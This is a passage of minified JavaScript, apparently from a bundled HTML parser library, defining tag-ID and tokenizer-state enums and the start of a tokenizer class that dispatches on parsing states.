MS=72]="MS",a[a.MTEXT=73]="MTEXT",a[a.NAV=74]="NAV",a[a.NOBR=75]="NOBR",a[a.NOFRAMES=76]="NOFRAMES",a[a.NOEMBED=77]="NOEMBED",a[a.NOSCRIPT=78]="NOSCRIPT",a[a.OBJECT=79]="OBJECT",a[a.OL=80]="OL",a[a.OPTGROUP=81]="OPTGROUP",a[a.OPTION=82]="OPTION",a[a.P=83]="P",a[a.PARAM=84]="PARAM",a[a.PLAINTEXT=85]="PLAINTEXT",a[a.PRE=86]="PRE",a[a.RB=87]="RB",a[a.RP=88]="RP",a[a.RT=89]="RT",a[a.RTC=90]="RTC",a[a.RUBY=91]="RUBY",a[a.S=92]="S",a[a.SCRIPT=93]="SCRIPT",a[a.SEARCH=94]="SEARCH",a[a.SECTION=95]="SECTION",a[a.SELECT=96]="SELECT",a[a.SOURCE=97]="SOURCE",a[a.SMALL=98]="SMALL",a[a.SPAN=99]="SPAN",a[a.STRIKE=100]="STRIKE",a[a.STRONG=101]="STRONG",a[a.STYLE=102]="STYLE",a[a.SUB=103]="SUB",a[a.SUMMARY=104]="SUMMARY",a[a.SUP=105]="SUP",a[a.TABLE=106]="TABLE",a[a.TBODY=107]="TBODY",a[a.TEMPLATE=108]="TEMPLATE",a[a.TEXTAREA=109]="TEXTAREA",a[a.TFOOT=110]="TFOOT",a[a.TD=111]="TD",a[a.TH=112]="TH",a[a.THEAD=113]="THEAD",a[a.TITLE=114]="TITLE",a[a.TR=115]="TR",a[a.TRACK=116]="TRACK",a[a.TT=117]="TT",a[a.U=118]="U",a[a.UL=119]="UL",a[a.SVG=120]="SVG",a[a.VAR=121]="VAR",a[a.WBR=122]="WBR",a[a.XMP=123]="XMP"})(S||(S={}));const v$=new Map([[ne.A,S.A],[ne.ADDRESS,S.ADDRESS],[ne.ANNOTATION_XML,S.ANNOTATION_XML],[ne.APPLET,S.APPLET],[ne.AREA,S.AREA],[ne.ARTICLE,S.ARTICLE],[ne.ASIDE,S.ASIDE],[ne.B,S.B],[ne.BASE,S.BASE],[ne.BASEFONT,S.BASEFONT],[ne.BGSOUND,S.BGSOUND],[ne.BIG,S.BIG],[ne.BLOCKQUOTE,S.BLOCKQUOTE],[ne.BODY,S.BODY],[ne.BR,S.BR],[ne.BUTTON,S.BUTTON],[ne.CAPTION,S.CAPTION],[ne.CENTER,S.CENTER],[ne.CODE,S.CODE],[ne.COL,S.COL],[ne.COLGROUP,S.COLGROUP],[ne.DD,S.DD],[ne.DESC,S.DESC],[ne.DETAILS,S.DETAILS],[ne.DIALOG,S.DIALOG],[ne.DIR,S.DIR],[ne.DIV,S.DIV],[ne.DL,S.DL],[ne.DT,S.DT],[ne.EM,S.EM],[ne.EMBED,S.EMBED],[ne.FIELDSET,S.FIELDSET],[ne.FIGCAPTION,S.FIGCAPTION],[ne.FIGURE,S.FIGURE],[ne.FONT,S.FONT],[ne.FOOTER,S.FOOTER],[ne.FOREIGN_OBJECT,S.FOREIGN_OBJECT],[ne.FORM,S.FORM],[ne.FRAME,S.FRAME],[ne.FRAMESET,S.FRAMESET],[ne.H1,S.H1],[ne.H2,S.H2],[ne.H3,S.H3],[ne.H4,S.H4],[ne.H5,S.H5],[ne.H6,S.H6],[ne.HEAD,S.HEAD],[ne.HEADER,S.HEADER],[ne.HGROUP,S.HGROUP],[ne.HR,S.HR],[ne.HTML,S.HTML],[ne.I,S.I],[ne.IMG,S.IMG],[ne.IMAGE,S.IMAGE],[ne.INPUT,S.INPUT],[ne.IFRAME,S.IFRAME],[ne.KEYGEN,S.KEYGEN],[ne.LABEL,S.LABEL],[ne.LI,S.LI],[ne.LINK,S.LINK],[ne.LISTING,S.LISTING],[ne.MAIN,S.MAIN],[ne.MALIGNMARK,S.MALIGNMARK],[ne.MARQUEE,S.MARQUEE],[ne.MATH,S.MATH],[ne.MENU,S.MENU],[ne.META,S.META],[ne.MGLYPH,S.MGLYPH],[ne.MI,S.MI],[ne.MO,S.MO],[ne.MN,S.MN],[ne.MS,S.MS],[ne.MTEXT,S.MTEXT],[ne.NAV,S.NAV],[ne.NOBR,S.NOBR],[ne.NOFRAMES,S.NOFRAMES],[ne.NOEMBED,S.NOEMBED],[ne.NOSCRIPT,S.NOSCRIPT],[ne.OBJECT,S.OBJECT],[ne.OL,S.OL],[ne.OPTGROUP,S.OPTGROUP],[ne.OPTION,S.OPTION],[ne.P,S.P],[ne.PARAM,S.PARAM],[ne.PLAINTEXT,S.PLAINTEXT],[ne.PRE,S.PRE],[ne.RB,S.RB],[ne.RP,S.RP],[ne.RT,S.RT],[ne.RTC,S.RTC],[ne.RUBY,S.RUBY],[ne.S,S.S],[ne.SCRIPT,S.SCRIPT],[ne.SEARCH,S.SEARCH],[ne.SECTION,S.SECTION],[ne.SELECT,S.SELECT],[ne.SOURCE,S.SOURCE],[ne.SMALL,S.SMALL],[ne.SPAN,S.SPAN],[ne.STRIKE,S.STRIKE],[ne.STRONG,S.STRONG],[ne.STYLE,S.STYLE],[ne.SUB,S.SUB],[ne.SUMMARY,S.SUMMARY],[ne.SUP,S.SUP],[ne.TABLE,S.TABLE],[ne.TBODY,S.TBODY],[ne.TEMPLATE,S.TEMPLATE],[ne.TEXTAREA,S.TEXTAREA],[ne.TFOOT,S.TFOOT],[ne.TD,S.TD],[ne.TH,S.TH],[ne.THEAD,S.THEAD],[ne.TITLE,S.TITLE],[ne.TR,S.TR],[ne.TRACK,S.TRACK],[ne.TT,S.TT],[ne.U,S.U],[ne.UL,S.UL],[ne.SVG,S.SVG],[ne.VAR,S.VAR],[ne.WBR,S.WBR],[ne.XMP,S.XMP]]);function eu(a){var e;return(e=v$.get(a))!==null&&e!==void 0?e:S.UNKNOWN}const Te=S,y$={[Ce.HTML]:new Set([Te.ADDRESS,Te.APPLET,Te.AREA,Te.ARTICLE,Te.ASIDE,Te.BASE,Te.BASEFONT,Te.BGSOUND,Te.BLOCKQUOTE,Te.BODY,Te.BR,Te.BUTTON,Te.CAPTION,Te.CENTER,Te.COL,Te.COLGROUP,Te.DD,Te.DETAILS,Te.DIR,Te.DIV,Te.DL,Te.DT,Te.EMBED,Te.FIELDSET,Te.FIGCAPTION,Te.FIGURE,Te.FOOTER,Te.FORM,Te.FRAME,Te.FRAMESET,Te.H1,Te.H2,Te.H3,Te.H4,Te.H5,Te.H6,Te.HEAD,Te.HEADER,Te.HGROUP,Te.HR,Te.HTML,Te.IFRAME,Te.IMG,Te.INPUT,Te.LI,Te.LINK,Te.LISTING,Te.MAIN,Te.MARQUEE,Te.MENU,Te.META,Te.NAV,Te.NOEMBED,Te.NOFRAMES,Te.NOSCRIPT,Te.OBJECT,Te.OL,Te.P,Te.PARAM,Te.PLAINTEXT,Te.PRE,Te.SCRIPT,Te.SECTION,Te.SELECT,Te.SOURCE,Te.STYLE,Te.SUMMARY,Te.TABLE,Te.TBODY,Te.TD,Te.TEMPLATE,Te.TEXTAREA,Te.TFOOT,Te.TH,Te.THEAD,Te.TITLE,Te.TR,Te.TRACK,Te.UL,Te.WBR,Te.XMP]),[Ce.MATHML]:new Set([Te.MI,Te.MO,Te.MN,Te.MS,Te.MTEXT,Te.ANNOTATION_XML]),[Ce.SVG]:new Set([Te.TITLE,Te.FOREIGN_OBJECT,Te.DESC]),[Ce.XLINK]:new Set,[Ce.XML]:new Set,[Ce.XMLNS]:new Set},k0=new Set([Te.H1,Te.H2,Te.H3,Te.H4,Te.H5,Te.H6]);ne.STYLE,ne.SCRIPT,ne.XMP,ne.IFRAME,ne.NOEMBED,ne.NOFRAMES,ne.PLAINTEXT;var H;(function(a){a[a.DATA=0]="DATA",a[a.RCDATA=1]="RCDATA",a[a.RAWTEXT=2]="RAWTEXT",a[a.SCRIPT_DATA=3]="SCRIPT_DATA",a[a.PLAINTEXT=4]="PLAINTEXT",a[a.TAG_OPEN=5]="TAG_OPEN",a[a.END_TAG_OPEN=6]="END_TAG_OPEN",a[a.TAG_NAME=7]="TAG_NAME",a[a.RCDATA_LESS_THAN_SIGN=8]="RCDATA_LESS_THAN_SIGN",a[a.RCDATA_END_TAG_OPEN=9]="RCDATA_END_TAG_OPEN",a[a.RCDATA_END_TAG_NAME=10]="RCDATA_END_TAG_NAME",a[a.RAWTEXT_LESS_THAN_SIGN=11]="RAWTEXT_LESS_THAN_SIGN",a[a.RAWTEXT_END_TAG_OPEN=12]="RAWTEXT_END_TAG_OPEN",a[a.RAWTEXT_END_TAG_NAME=13]="RAWTEXT_END_TAG_NAME",a[a.SCRIPT_DATA_LESS_THAN_SIGN=14]="SCRIPT_DATA_LESS_THAN_SIGN",a[a.SCRIPT_DATA_END_TAG_OPEN=15]="SCRIPT_DATA_END_TAG_OPEN",a[a.SCRIPT_DATA_END_TAG_NAME=16]="SCRIPT_DATA_END_TAG_NAME",a[a.SCRIPT_DATA_ESCAPE_START=17]="SCRIPT_DATA_ESCAPE_START",a[a.SCRIPT_DATA_ESCAPE_START_DASH=18]="SCRIPT_DATA_ESCAPE_START_DASH",a[a.SCRIPT_DATA_ESCAPED=19]="SCRIPT_DATA_ESCAPED",a[a.SCRIPT_DATA_ESCAPED_DASH=20]="SCRIPT_DATA_ESCAPED_DASH",a[a.SCRIPT_DATA_ESCAPED_DASH_DASH=21]="SCRIPT_DATA_ESCAPED_DASH_DASH",a[a.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN=22]="SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN",a[a.SCRIPT_DATA_ESCAPED_END_TAG_OPEN=23]="SCRIPT_DATA_ESCAPED_END_TAG_OPEN",a[a.SCRIPT_DATA_ESCAPED_END_TAG_NAME=24]="SCRIPT_DATA_ESCAPED_END_TAG_NAME",a[a.SCRIPT_DATA_DOUBLE_ESCAPE_START=25]="SCRIPT_DATA_DOUBLE_ESCAPE_START",a[a.SCRIPT_DATA_DOUBLE_ESCAPED=26]="SCRIPT_DATA_DOUBLE_ESCAPED",a[a.SCRIPT_DATA_DOUBLE_ESCAPED_DASH=27]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH",a[a.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH=28]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH",a[a.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN=29]="SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN",a[a.SCRIPT_DATA_DOUBLE_ESCAPE_END=30]="SCRIPT_DATA_DOUBLE_ESCAPE_END",a[a.BEFORE_ATTRIBUTE_NAME=31]="BEFORE_ATTRIBUTE_NAME",a[a.ATTRIBUTE_NAME=32]="ATTRIBUTE_NAME",a[a.AFTER_ATTRIBUTE_NAME=33]="AFTER_ATTRIBUTE_NAME",a[a.BEFORE_ATTRIBUTE_VALUE=34]="BEFORE_ATTRIBUTE_VALUE",a[a.ATTRIBUTE_VALUE_DOUBLE_QUOTED=35]="ATTRIBUTE_VALUE_DOUBLE_QUOTED",a[a.ATTRIBUTE_VALUE_SINGLE_QUOTED=36]="ATTRIBUTE_VALUE_SINGLE_QUOTED",a[a.ATTRIBUTE_VALUE_UNQUOTED=37]="ATTRIBUTE_VALUE_UNQUOTED",a[a.AFTER_ATTRIBUTE_VALUE_QUOTED=38]="AFTER_ATTRIBUTE_VALUE_QUOTED",a[a.SELF_CLOSING_START_TAG=39]="SELF_CLOSING_START_TAG",a[a.BOGUS_COMMENT=40]="BOGUS_COMMENT",a[a.MARKUP_DECLARATION_OPEN=41]="MARKUP_DECLARATION_OPEN",a[a.COMMENT_START=42]="COMMENT_START",a[a.COMMENT_START_DASH=43]="COMMENT_START_DASH",a[a.COMMENT=44]="COMMENT",a[a.COMMENT_LESS_THAN_SIGN=45]="COMMENT_LESS_THAN_SIGN",a[a.COMMENT_LESS_THAN_SIGN_BANG=46]="COMMENT_LESS_THAN_SIGN_BANG",a[a.COMMENT_LESS_THAN_SIGN_BANG_DASH=47]="COMMENT_LESS_THAN_SIGN_BANG_DASH",a[a.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH=48]="COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH",a[a.COMMENT_END_DASH=49]="COMMENT_END_DASH",a[a.COMMENT_END=50]="COMMENT_END",a[a.COMMENT_END_BANG=51]="COMMENT_END_BANG",a[a.DOCTYPE=52]="DOCTYPE",a[a.BEFORE_DOCTYPE_NAME=53]="BEFORE_DOCTYPE_NAME",a[a.DOCTYPE_NAME=54]="DOCTYPE_NAME",a[a.AFTER_DOCTYPE_NAME=55]="AFTER_DOCTYPE_NAME",a[a.AFTER_DOCTYPE_PUBLIC_KEYWORD=56]="AFTER_DOCTYPE_PUBLIC_KEYWORD",a[a.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER=57]="BEFORE_DOCTYPE_PUBLIC_IDENTIFIER",a[a.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED=58]="DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED",a[a.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED=59]="DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED",a[a.AFTER_DOCTYPE_PUBLIC_IDENTIFIER=60]="AFTER_DOCTYPE_PUBLIC_IDENTIFIER",a[a.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS=61]="BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS",a[a.AFTER_DOCTYPE_SYSTEM_KEYWORD=62]="AFTER_DOCTYPE_SYSTEM_KEYWORD",a[a.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER=63]="BEFORE_DOCTYPE_SYSTEM_IDENTIFIER",a[a.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED=64]="DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED",a[a.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED=65]="DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED",a[a.AFTER_DOCTYPE_SYSTEM_IDENTIFIER=66]="AFTER_DOCTYPE_SYSTEM_IDENTIFIER",a[a.BOGUS_DOCTYPE=67]="BOGUS_DOCTYPE",a[a.CDATA_SECTION=68]="CDATA_SECTION",a[a.CDATA_SECTION_BRACKET=69]="CDATA_SECTION_BRACKET",a[a.CDATA_SECTION_END=70]="CDATA_SECTION_END",a[a.CHARACTER_REFERENCE=71]="CHARACTER_REFERENCE",a[a.AMBIGUOUS_AMPERSAND=72]="AMBIGUOUS_AMPERSAND"})(H||(H={}));const tt={DATA:H.DATA,RCDATA:H.RCDATA,RAWTEXT:H.RAWTEXT,SCRIPT_DATA:H.SCRIPT_DATA,PLAINTEXT:H.PLAINTEXT,CDATA_SECTION:H.CDATA_SECTION};function E$(a){return a>=z.DIGIT_0&&a<=z.DIGIT_9}function Pd(a){return a>=z.LATIN_CAPITAL_A&&a<=z.LATIN_CAPITAL_Z}function S$(a){return a>=z.LATIN_SMALL_A&&a<=z.LATIN_SMALL_Z}function qs(a){return S$(a)||Pd(a)}function mL(a){return qs(a)||E$(a)}function Pf(a){return a+32}function XM(a){return a===z.SPACE||a===z.LINE_FEED||a===z.TABULATION||a===z.FORM_FEED}function fL(a){return XM(a)||a===z.SOLIDUS||a===z.GREATER_THAN_SIGN}function C$(a){return a===z.NULL?pe.nullCharacterReference:a>1114111?pe.characterReferenceOutsideUnicodeRange:WM(a)?pe.surrogateCharacterReference:YM(a)?pe.noncharacterCharacterReference:KM(a)||a===z.CARRIAGE_RETURN?pe.controlCharacterReference:null}class T${constructor(e,t){this.options=e,this.handler=t,this.paused=!1,this.inLoop=!1,this.inForeignNode=!1,this.lastStartTagName="",this.active=!1,this.state=H.DATA,this.returnState=H.DATA,this.entityStartPos=0,this.consumedAfterSnapshot=-1,this.currentCharacterToken=null,this.currentToken=null,this.currentAttr={name:"",value:""},this.preprocessor=new l$(t),this.currentLocation=this.getCurrentLocation(-1),this.entityDecoder=new g$(c$,(n,i)=>{this.preprocessor.pos=this.entityStartPos+i-1,this._flushCodePointConsumedAsCharacterReference(n)},t.onParseError?{missingSemicolonAfterCharacterReference:()=>{this._err(pe.missingSemicolonAfterCharacterReference,1)},absenceOfDigitsInNumericCharacterReference:n=>{this._err(pe.absenceOfDigitsInNumericCharacterReference,this.entityStartPos-this.preprocessor.pos+n)},validateNumericCharacterReference:n=>{const i=C$(n);i&&this._err(i,1)}}:void 0)}_err(e,t=0){var n,i;(i=(n=this.handler).onParseError)===null||i===void 0||i.call(n,this.preprocessor.getError(e,t))}getCurrentLocation(e){return this.options.sourceCodeLocationInfo?{startLine:this.preprocessor.line,startCol:this.preprocessor.col-e,startOffset:this.preprocessor.offset-e,endLine:-1,endCol:-1,endOffset:-1}:null}_runParsingLoop(){if(!this.inLoop){for(this.inLoop=!0;this.active&&!this.paused;){this.consumedAfterSnapshot=0;const e=this._consume();this._ensureHibernation()||this._callState(e)}this.inLoop=!1}}pause(){this.paused=!0}resume(e){if(!this.paused)throw new Error("Parser was already resumed");this.paused=!1,!this.inLoop&&(this._runParsingLoop(),this.paused||e?.())}write(e,t,n){this.active=!0,this.preprocessor.write(e,t),this._runParsingLoop(),this.paused||n?.()}insertHtmlAtCurrentPos(e){this.active=!0,this.preprocessor.insertHtmlAtCurrentPos(e),this._runParsingLoop()}_ensureHibernation(){return this.preprocessor.endOfChunkHit?(this.preprocessor.retreat(this.consumedAfterSnapshot),this.consumedAfterSnapshot=0,this.active=!1,!0):!1}_consume(){return this.consumedAfterSnapshot++,this.preprocessor.advance()}_advanceBy(e){this.consumedAfterSnapshot+=e;for(let t=0;t<e;t++)this.preprocessor.advance()}_consumeSequenceIfMatch(e,t){return this.preprocessor.startsWith(e,t)?(this._advanceBy(e.length-1),!0):!1}_createStartTagToken(){this.currentToken={type:na.START_TAG,tagName:"",tagID:S.UNKNOWN,selfClosing:!1,ackSelfClosing:!1,attrs:[],location:this.getCurrentLocation(1)}}_createEndTagToken(){this.currentToken={type:na.END_TAG,tagName:"",tagID:S.UNKNOWN,selfClosing:!1,ackSelfClosing:!1,attrs:[],location:this.getCurrentLocation(2)}}_createCommentToken(e){this.currentToken={type:na.COMMENT,data:"",location:this.getCurrentLocation(e)}}_createDoctypeToken(e){this.currentToken={type:na.DOCTYPE,name:e,forceQuirks:!1,publicId:null,systemId:null,location:this.currentLocation}}_createCharacterToken(e,t){this.currentCharacterToken={type:e,chars:t,location:this.currentLocation}}_createAttr(e){this.currentAttr={name:e,value:""},this.currentLocation=this.getCurrentLocation(0)}_leaveAttrName(){var e,t;const n=this.currentToken;if($M(n,this.currentAttr.name)===null){if(n.attrs.push(this.currentAttr),n.location&&this.currentLocation){const i=(e=(t=n.location).attrs)!==null&&e!==void 0?e:t.attrs=Object.create(null);i[this.currentAttr.name]=this.currentLocation,this._leaveAttrValue()}}else this._err(pe.duplicateAttribute)}_leaveAttrValue(){this.currentLocation&&(this.currentLocation.endLine=this.preprocessor.line,this.currentLocation.endCol=this.preprocessor.col,this.currentLocation.endOffset=this.preprocessor.offset)}prepareToken(e){this._emitCurrentCharacterToken(e.location),this.currentToken=null,e.location&&(e.location.endLine=this.preprocessor.line,e.location.endCol=this.preprocessor.col+1,e.location.endOffset=this.preprocessor.offset+1),this.currentLocation=this.getCurrentLocation(-1)}emitCurrentTagToken(){const e=this.currentToken;this.prepareToken(e),e.tagID=eu(e.tagName),e.type===na.START_TAG?(this.lastStartTagName=e.tagName,this.handler.onStartTag(e)):(e.attrs.length>0&&this._err(pe.endTagWithAttributes),e.selfClosing&&this._err(pe.endTagWithTrailingSolidus),this.handler.onEndTag(e)),this.preprocessor.dropParsedChunk()}emitCurrentComment(e){this.prepareToken(e),this.handler.onComment(e),this.preprocessor.dropParsedChunk()}emitCurrentDoctype(e){this.prepareToken(e),this.handler.onDoctype(e),this.preprocessor.dropParsedChunk()}_emitCurrentCharacterToken(e){if(this.currentCharacterToken){switch(e&&this.currentCharacterToken.location&&(this.currentCharacterToken.location.endLine=e.startLine,this.currentCharacterToken.location.endCol=e.startCol,this.currentCharacterToken.location.endOffset=e.startOffset),this.currentCharacterToken.type){case na.CHARACTER:{this.handler.onCharacter(this.currentCharacterToken);break}case na.NULL_CHARACTER:{this.handler.onNullCharacter(this.currentCharacterToken);break}case na.WHITESPACE_CHARACTER:{this.handler.onWhitespaceCharacter(this.currentCharacterToken);break}}this.currentCharacterToken=null}}_emitEOFToken(){const e=this.getCurrentLocation(0);e&&(e.endLine=e.startLine,e.endCol=e.startCol,e.endOffset=e.startOffset),this._emitCurrentCharacterToken(e),this.handler.onEof({type:na.EOF,location:e}),this.active=!1}_appendCharToCurrentCharacterToken(e,t){if(this.currentCharacterToken)if(this.currentCharacterToken.type===e){this.currentCharacterToken.chars+=t;return}else this.currentLocation=this.getCurrentLocation(0),this._emitCurrentCharacterToken(this.currentLocation),this.preprocessor.dropParsedChunk();this._createCharacterToken(e,t)}_emitCodePoint(e){const t=XM(e)?na.WHITESPACE_CHARACTER:e===z.NULL?na.NULL_CHARACTER:na.CHARACTER;this._appendCharToCurrentCharacterToken(t,String.fromCodePoint(e))}_emitChars(e){this._appendCharToCurrentCharacterToken(na.CHARACTER,e)}_startCharacterReference(){this.returnState=this.state,this.state=H.CHARACTER_REFERENCE,this.entityStartPos=this.preprocessor.pos,this.entityDecoder.startEntity(this._isCharacterReferenceInAttribute()?Uo.Attribute:Uo.Legacy)}_isCharacterReferenceInAttribute(){return this.returnState===H.ATTRIBUTE_VALUE_DOUBLE_QUOTED||this.returnState===H.ATTRIBUTE_VALUE_SINGLE_QUOTED||this.returnState===H.ATTRIBUTE_VALUE_UNQUOTED}_flushCodePointConsumedAsCharacterReference(e){this._isCharacterReferenceInAttribute()?this.currentAttr.value+=String.fromCodePoint(e):this._emitCodePoint(e)}_callState(e){switch(this.state){case H.DATA:{this._stateData(e);break}case H.RCDATA:{this._stateRcdata(e);break}case H.RAWTEXT:{this._stateRawtext(e);break}case H.SCRIPT_DATA:{this._stateScriptData(e);break}case H.PLAINTEXT:{this._statePlaintext(e);break}case H.TAG_OPEN:{this._stateTagOpen(e);break}case H.END_TAG_OPEN:{this._stateEndTagOpen(e);break}case H.TAG_NAME:{this._stateTagName(e);break}case H.RCDATA_LESS_THAN_SIGN:{this._stateRcdataLessThanSign(e);break}case H.RCDATA_END_TAG_OPEN:{this._stateRcdataEndTagOpen(e);break}case H.RCDATA_END_TAG_NAME:{this._stateRcdataEndTagName(e);break}case H.RAWTEXT_LESS_THAN_SIGN:{this._stateRawtextLessThanSign(e);break}case H.RAWTEXT_END_TAG_OPEN:{this._stateRawtextEndTagOpen(e);break}case H.RAWTEXT_END_TAG_NAME:{this._stateRawtextEndTagName(e);break}case H.SCRIPT_DATA_LESS_THAN_SIGN:{this._stateScriptDataLessThanSign(e);break}case H.SCRIPT_DATA_END_TAG_OPEN:{this._stateScriptDataEndTagOpen(e);break}case H.SCRIPT_DATA_END_TAG_NAME:{this._stateScriptDataEndTagName(e);break}case H.SCRIPT_DATA_ESCAPE_START:{this._stateScriptDataEscapeStart(e);break}case H.SCRIPT_DATA_ESCAPE_START_DASH:{this._stateScriptDataEscapeStartDash(e);break}case H.SCRIPT_DATA_ESCAPED:{this._stateScriptDataEscaped(e);break}case H.SCRIPT_DATA_ESCAPED_DASH:{this._stateScriptDataEscapedDash(e);break}case H.SCRIPT_DATA_ESCAPED_DASH_DASH:{this._stateScriptDataEscapedDashDash(e);break}case H.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN:{this._stateScriptDataEscapedLessThanSign(e);break}case H.SCRIPT_DATA_ESCAPED_END_TAG_OPEN:{this._stateScriptDataEscapedEndTagOpen(e);break}case H.SCRIPT_DATA_ESCAPED_END_TAG_NAME:{this._stateScriptDataEscapedEndTagName(e);break}case H.SCRIPT_DATA_DOUBLE_ESCAPE_START:{this._stateScriptDataDoubleEscapeStart(e);break}case H.SCRIPT_DATA_DOUBLE_ESCAPED:{this._stateScriptDataDoubleEscaped(e);break}case H.SCRIPT_DATA_DOUBLE_ESCAPED_DASH:{this._stateScriptDataDoubleEscapedDash(e);break}case H.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH:{this._stateScriptDataDoubleEscapedDashDash(e);break}case H.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN:{this._stateScriptDataDoubleEscapedLessThanSign(e);break}case H.SCRIPT_DATA_DOUBLE_ESCAPE_END:{this._stateScriptDataDoubleEscapeEnd(e);break}case H.BEFORE_ATTRIBUTE_NAME:{this._stateBeforeAttributeName(e);break}case H.ATTRIBUTE_NAME:{this._stateAttributeName(e);break}case H.AFTER_ATTRIBUTE_NAME:{this._stateAfterAttributeName(e);break}case H.BEFORE_ATTRIBUTE_VALUE:{this._stateBeforeAttributeValue(e);break}case H.ATTRIBUTE_VALUE_DOUBLE_QUOTED:{this._stateAttributeValueDoubleQuoted(e);break}case H.ATTRIBUTE_VALUE_SINGLE_QUOTED:{this._stateAttributeValueSingleQuoted(e);break}case H.ATTRIBUTE_VALUE_UNQUOTED:{this._stateAttributeValueUnquoted(e);break}case H.AFTER_ATTRIBUTE_VALUE_QUOTED:{this._stateAfterAttributeValueQuoted(e);break}case H.SELF_CLOSING_START_TAG:{this._stateSelfClosingStartTag(e);break}case H.BOGUS_COMMENT:{this._stateBogusComment(e);break}case H.MARKUP_DECLARATION_OPEN:{this._stateMarkupDeclarationOpen(e);break}case H.COMMENT_START:{this._stateCommentStart(e);break}case H.COMMENT_START_DASH:{this._stateCommentStartDash(e);break}case H.COMMENT:{this._stateComment(e);break}case H.COMMENT_LESS_THAN_SIGN:{this._stateCommentLessThanSign(e);break}case H.COMMENT_LESS_THAN_SIGN_BANG:{this._stateCommentLessThanSignBang(e);break}case H.COMMENT_LESS_THAN_SIGN_BANG_DASH:{this._stateCommentLessThanSignBangDash(e);break}case H.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH:{this._stateCommentLessThanSignBangDashDash(e);break}case H.COMMENT_END_DASH:{this._stateCommentEndDash(e);break}case H.COMMENT_END:{this._stateCommentEnd(e);break}case H.COMMENT_END_BANG:{this._stateCommentEndBang(e);break}case H.DOCTYPE:{this._stateDoctype(e);break}case H.BEFORE_DOCTYPE_NAME:{this._stateBeforeDoctypeName(e);break}case H.DOCTYPE_NAME:{this._stateDoctypeName(e);break}case H.AFTER_DOCTYPE_NAME:{this._stateAfterDoctypeName(e);break}case H.AFTER_DOCTYPE_PUBLIC_KEYWORD:{this._stateAfterDoctypePublicKeyword(e);break}case H.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER:{this._stateBeforeDoctypePublicIdentifier(e);break}case H.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED:{this._stateDoctypePublicIdentifierDoubleQuoted(e);break}case H.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED:{this._stateDoctypePublicIdentifierSingleQuoted(e);break}case H.AFTER_DOCTYPE_PUBLIC_IDENTIFIER:{this._stateAfterDoctypePublicIdentifier(e);break}case H.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS:{this._stateBetweenDoctypePublicAndSystemIdentifiers(e);break}case H.AFTER_DOCTYPE_SYSTEM_KEYWORD:{this._stateAfterDoctypeSystemKeyword(e);break}case H.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER:{this._stateBeforeDoctypeSystemIdentifier(e);break}case H.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED:{this._stateDoctypeSystemIdentifierDoubleQuoted(e);break}case H.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED:{this._stateDoctypeSystemIdentifierSingleQuoted(e);break}case H.AFTER_DOCTYPE_SYSTEM_IDENTIFIER:{this._stateAfterDoctypeSystemIdentifier(e);break}case H.BOGUS_DOCTYPE:{this._stateBogusDoctype(e);break}case H.CDATA_SECTION:{this._stateCdataSection(e);break}case H.CDATA_SECTION_BRACKET:{this._stateCdataSectionBracket(e);break}case H.CDATA_SECTION_END:{this._stateCdataSectionEnd(e);break}case H.CHARACTER_REFERENCE:{this._stateCharacterReference();break}case H.AMBIGUOUS_AMPERSAND:{this._stateAmbiguousAmpersand(e);break}default:throw new Error("Unknown state")}}_stateData(e){switch(e){case z.LESS_THAN_SIGN:{this.state=H.TAG_OPEN;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this._emitCodePoint(e);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(e)}}_stateRcdata(e){switch(e){case z.AMPERSAND:{this._startCharacterReference();break}case z.LESS_THAN_SIGN:{this.state=H.RCDATA_LESS_THAN_SIGN;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this._emitChars(Ha);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(e)}}_stateRawtext(e){switch(e){case z.LESS_THAN_SIGN:{this.state=H.RAWTEXT_LESS_THAN_SIGN;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this._emitChars(Ha);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(e)}}_stateScriptData(e){switch(e){case z.LESS_THAN_SIGN:{this.state=H.SCRIPT_DATA_LESS_THAN_SIGN;break}case z.NULL:{this._err(pe.unexpectedNullCharacter),this._emitChars(Ha);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(e)}}_statePlaintext(e){switch(e){case z.NULL:{this._err(pe.unexpectedNullCharacter),this._emitChars(Ha);break}case 